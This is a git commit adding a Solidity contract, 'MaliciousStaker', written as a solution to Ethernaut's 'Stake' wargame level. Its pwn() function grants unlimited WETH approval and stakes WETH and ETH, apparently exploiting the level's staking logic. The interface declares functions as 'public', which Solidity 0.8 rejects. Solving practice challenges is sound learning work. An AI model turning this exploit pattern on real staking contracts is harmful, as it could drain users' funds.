6d7b11454cf7c38c5f32c01f6938c1dc44e10df7
Aryan Malik <aryanhunny98@gmail.com>
2024-07-21 21:48:18 +0530

    Added 31.Stake.sol that be helpful in 31st challenge of Ethernaut

---
+++ Ethernaut/answers/31.Stake.sol
@@ -0,0 +1,42 @@
+/**
+    This contract is used only for the requirements of 3rd and 4th condition which is mentioned here -> 
+*/
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Stake {
+    function StakeETH() public payable;
+    function StakeWETH(uint256 amount) public returns (bool);
+}
+
+interface IWETH {
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+contract MaliciousStaker {
+    Stake private immutable i_stake;
+    IWETH private i_weth;
+
+    uint256 private defaultStake = 0.001 ether + 1 wei;
+
+    constructor(Stake _stake, IWETH _weth) payable {
+        require(msg.value >= defaultStake, "Not enough eth sent");
+        i_stake = _stake;
+        i_weth = _weth;
+    }
+
+    function pwn() external {
+        stakeWETH();
+        stakeETH();
+    }
+
+    function stakeWETH() private {
+        i_weth.approve(address(i_stake), type(uint256).max);
+        i_stake.StakeWETH(defaultStake);
+    }
+
+    function stakeETH() private {
+        i_stake.StakeETH{value: defaultStake}();
+    } 
+}
